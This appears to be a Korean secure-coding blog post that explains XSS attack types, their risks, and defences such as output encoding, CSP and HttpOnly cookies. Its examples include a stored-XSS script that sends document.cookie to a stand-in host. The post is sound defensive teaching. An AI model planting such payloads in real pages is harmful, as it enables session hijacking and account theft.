---
title: "[Secure Coding] XSS (Cross-Site Scripting)란 무엇일까??"
description: "JAVA 단기 심화 부트캠프"
date: "2024-08-19"
banner:
  src: "../../../images/articles/secure/secure-coding-img.jpeg"
  alt: "JAVA 단기 심화 부트캠프"
  caption: 'Photo by <u><a href="https://unsplash.com/photos/Nc5Q_CEcY44">Google</a></u>'
categories:
  - "ALL"
  - "Secure Coding"
keywords:
  - "JAVA" 
  - "단기 심화 부트캠프"
  - "Secure Coding"
  - "XSS"
---
## XSS란?
`XSS`는 웹 애플리케이션의 취약점을 이용해 악성 스크립트를 다른 사용자의 브라우저에서 실행시키는 공격이다. 이를 통해 공격자는 사용자의 세션을 가로채거나, 악성 코드 실행, 웹사이트 변조 등의 공격을 수행할 수 있다.

## XSS 공격의 유형
1. 반사형 XSS (Reflected XSS)
* 사용자가 입력한 데이터가 즉시 웹 페이지에 반영되어 발생하는 공격이다.
* 주로 URL에 포함된 악성 스크립트를 통해 이루어진다.
* 예시: 사용자가 http://example.com/search?q=<script>alert(document.cookie)</script>와 같은 URL을 입력하면, 웹 애플리케이션이 검색어를 그대로 출력하여 스크립트가 실행된다.
2. 저장형 XSS (Stored XSS)
* 악성 스크립트가 서버에 저장되어 여러 사용자가 해당 스크립트를 실행하게 되는 경우이다.
* 예시: 사용자가 게시판에 <script>document.location='http://127.0.0.1/cookie?'+document.cookie</script>와 같은 악성 스크립트를 포함한 글을 작성하면, 해당 글을 보는 모든 사용자의 브라우저에서 스크립트가 실행된다.
3. DOM 기반 XSS (DOM-based XSS)
* 클라이언트 측에서 JavaScript를 통해 DOM을 동적으로 조작할 때 발생한다.
* 예시: 클라이언트 측 스크립트가 URL 파라미터를 읽어와 DOM에 삽입할 때, 악성 스크립트가 포함될 수 있다.
## XSS 공격의 위험성
* 세션 하이재킹: 사용자의 세션 쿠키를 탈취하여 공격자가 사용자의 계정으로 로그인할 수 있다.
* 악성 코드 실행: 악성 스크립트를 실행하여 사용자의 시스템에 피해를 줄 수 있다.
* 피싱 공격: 사용자를 속여 민감한 정보를 입력하도록 유도할 수 있다.
* 웹사이트 변조: 웹페이지의 내용을 변경하여 사용자에게 잘못된 정보를 제공할 수 있다.
## XSS 방어 기법

1. 입력 검증 및 인코딩

* 사용자 입력을 철저히 검증하고, 출력할 때 적절히 인코딩하여 스크립트가 실행되지 않도록 한다.
* 예시: HTML 인코딩, JavaScript 인코딩, URL 인코딩 등을 사용하여 사용자 입력을 안전하게 처리한다.

2. Content Security Policy (CSP)

* 웹 애플리케이션이 허용된 콘텐츠 소스를 명시하여 XSS 및 데이터 삽입 공격을 방지하는 보안 기능이다.
* 예시: Content-Security-Policy: default-src 'self' https://trusted.cdn.com;

3. HTTPOnly 쿠키 사용

* 세션 쿠키에 HttpOnly 속성을 설정하여 JavaScript에서 접근하지 못하도록 한다.
* 예시: Set-Cookie: sessionId=abc123; HttpOnly; Secure

4. JavaScript 안전하게 사용하기

* 클라이언트 측에서 사용자 입력을 직접적으로 처리하지 않도록 한다.
* JavaScript를 사용할 때, DOM 조작 시 사용자 입력을 안전하게 처리한다.



이와 같은 방법들을 통해 XSS 공격을 효과적으로 방어할 수 있다. 개발자는 항상 보안을 염두에 두고 코드를 작성해야 하며, 사용자 입력 처리에 각별히 주의해야 한다